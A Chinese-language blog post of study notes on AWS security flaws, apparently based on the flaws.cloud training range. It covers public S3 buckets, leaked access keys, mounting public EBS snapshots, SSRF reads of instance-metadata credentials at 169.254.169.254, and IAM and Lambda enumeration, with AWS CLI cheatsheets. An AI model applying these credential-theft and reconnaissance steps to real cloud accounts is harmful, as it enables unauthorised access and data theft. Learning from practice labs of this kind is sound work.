---
title: 'AWS 常见安全问题总结（一）'
date: 2024-03-24 20:18:36
tags: [云安全,学习笔记]
published: true
hideInList: false
feature: 
isTop: false
---


公开靶场:http://flaws.cloud/

## S3常见的安全问题

### 安全问题概括

概括如下：

1. s3桶名为全局变量，默认是aws上任意两个用户不能有重名s3桶变量名。如一域名负载在s3，则可以通过 `<s3-name>.<hostname>` 访问
2. S3配置IAM下， `Everyone` 意味着所有互联网上所有人。而不是，自己aws账户下的所有人，此外还有 `Any Authenticated AWS User` ，意味着所有有aws账户的人。后者web页面不支持，但是仍然可以通过SDK和第三方工具配置。

### 命令cheatsheet

1. aws同步下载文件到本地

```bash
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
```

1. 配置新的access_key 和 secret_access_key (以靶场flaws的level3为例子）

```bash
aws configure --profile flawslevel3
```

查看对应的profile下的资产内容

```bash
 aws s3 ls --profile flawslevel3
```

## EC2常见安全问题

常见概念：

- STS(Security Token Service) ：控制不同aws的安全控制
    - GetCallerIdentity: 显示账户可被控制的api **这个操作不需要任何权限**，即使管理员将拒绝访问：  `aws sts get-caller-identity --profile flawslevel3`
- snapshot 快照：快照是 Amazon 特有的东西，可让您在帐户之间传输卷上的数据。它们是从卷（volume）创建的“只读”备份
- aws_session_token： 除了`access_key` 和 `secret_access_key` 会泄漏外，也有token泄漏的场景。需要一并加入到~/.aws/credentials下，添加 `aws_session_token = ..`

### 安全问题概述：

1. 泄漏 `access_key` 和 `secret_access_key`, 利用方式，通过aws cli进一步获取更多信息和提权。
2. 快照记录了volume的信息，并且可以绕过ec2密码，来利用快照访问ec2示例。这就导致了黑客可以利用快照来获取volume信息，并结合aws创建volumn的权限（`createVolumePermission`） 将受害者volume挂载到攻击者的EC2示例上（需要确保region一致）。从而获取到ec2上的内容。（需要结合第1点来利用）
3. ssrf漏洞，导致可以利用 `169.254.169.254` 获取meta-data。（AWS在IMDSv2下，设立了特定的header，但IMDSv2并非默认强制）关于IMDSv1的问题看这篇[文章](https://kishoreramk.medium.com/securing-aws-understanding-ec2-imds-vulnerabilities-and-learning-from-the-capital-one-breach-6f753e06cd66)
    1. 169.254.169.254/latest/meta-data/iam/security-credentials/flaws
    2. 169.254.169.254/latest/meta-data/iam/info
    3. 169.254.169.254/latest/meta-data/iam/
4. `SecurityAudit` 权限

### cheatsheet

1. 显示全部STS（Security Token Service)

```bash
aws sts get-caller-identity --profile flawslevel3 
```

1. 显示ec2实例密钥对（需要提前profile配好region）

```bash
aws  --profile flawslevel3 ec2  describe-key-pairs
```

1. 检查属于用户id为指定id(这里为975426262029）下的快照

```bash
aws ec2 describe-snapshots --owner-id 975426262029 --profile flawslevel3
```

1. 查看指定快照id的 `createVolumePermission` 权限

```bash
aws ec2 describe-snapshot-attribute --snapshot-id snap-0b49342abd1bdcb89 --attribute createVolumePermission --profile flawslevel3
```

1. volume绑定ec2 instance & 进一步的利用

```bash
aws ec2 attach-volume —-volume-id vol-randnum --instance-id i-randnum —-device /dev/sdf —-region us-west-2
```

进一步利用所需命令补充（待后续优化笔记）：

Download the key pair and SSH into it. change the permission of downloaded pem file. `ssh -i YOUR_KEY.pem ubuntu@ec2-54-191-240-80.us-west-2.compute.amazonaws.com`

First list information about all available block devices using `lsblk.` `xvda1` is our available volume.

view drive information: `sudo file -s /dev/xvdf1`

Mount drive: `sudo mount /dev/xvdf1 /mnt`

## IAM常见安全问题

1. `SecurityAudit` 的policy能够帮助黑客去读区你或别的iam信息，然后寻找薄弱点

### cheatsheet

policy精确查询：

列出当前用户iam信息：创建时间，路径，unique id，arn

```bash
aws --profile level6 iam get-user
```

List attached-user-policies attached to user ( `{username}` 为get-user获取到的用户名）

```bash
aws --profile level6 iam list-attached-user-policies --username {username}
```

list-users

```bash
aws iam list-users --profile level6
```

list policies（这里会有arn的信息）

```bash
aws iam list-policies --profile level6
```

根据arn信息和version id，来查看具体policy信息 （这里arn-id为list-attached-user-policies命令下的）

```bash
aws --profile level6 iam get-policy-version --policy-arn {arn-id} --version-id v4
```

lambda的精确查询：

查找有哪些lambda 这一步可以获取到lambda函数名

```bash
aws --region us-west-2 --profile level6 list-funtions
```

查看对应函数名的policy信息

```bash
aws --region us-west-2 --profile level6 lambda get-policy --function-name {func-name}
```

这一步可以获取到rest-api-id ，然后访问 [`https://api-id.execute-api.us-east-2.amazonaws.com`](https://api-id.execute-api.us-east-2.amazonaws.com/) 

## 学习文章：

- [https://kishoreramk.medium.com/hacking-aws-flaws-cloud-walkthrough-2f13083b0b4d](https://kishoreramk.medium.com/hacking-aws-flaws-cloud-walkthrough-2f13083b0b4d)
- [https://kishoreramk.medium.com/securing-aws-understanding-ec2-imds-vulnerabilities-and-learning-from-the-capital-one-breach-6f753e06cd66](https://kishoreramk.medium.com/securing-aws-understanding-ec2-imds-vulnerabilities-and-learning-from-the-capital-one-breach-6f753e06cd66)